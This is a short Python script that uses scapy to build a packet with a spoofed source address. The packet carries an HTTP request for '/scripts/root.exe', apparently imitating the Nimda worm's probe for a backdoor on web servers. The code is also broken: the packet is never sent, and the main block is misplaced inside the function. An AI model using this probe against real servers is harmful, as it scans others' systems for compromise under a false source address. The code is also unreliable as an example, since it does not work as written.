from scapy.all import Ether, IP,TCP, Raw, send

def send_nimd_packet(target_ip, target_port=80, source_ip="192.168.1.1",source_port=12345):
    packet = (
        IP(src=source_ip, dst=target_ip)
        / TCP(sport=source_port, dport=target_port)
        / Raw(load="GET /scripts/root.exe HTTP/1.0\r\nHost: example.com\r\n\r\n")
    )
    
    if __name__ == "__main__":
        target_ip = "192.168.xxx.xxx"
        send_nimd_packet(target_ip)